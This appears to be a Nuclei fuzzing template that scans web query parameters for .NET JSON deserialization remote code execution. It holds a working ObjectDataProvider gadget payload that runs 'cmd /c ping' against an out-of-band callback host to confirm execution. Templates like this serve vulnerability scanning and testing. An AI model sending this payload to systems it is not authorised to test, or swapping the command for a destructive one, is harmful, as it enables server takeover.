http:
- fuzzing:
  - fuzz:
    - '{{rce}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    rce:
    - '{ "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0,
      Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList,
      mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","$values":["cmd","/cping
      {{interactsh-url}}"]},"ObjectInstance":{"$type":"System.Diagnostics.Process,
      System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}'
  redirects: true
  stop-at-first-match: true
id: rce-dotnet-jackson
info:
  author: reewardius
  name: RCE DotNet Jackson
  severity: critical
  tags: fuzzing-rce,fuzzing-req,dast
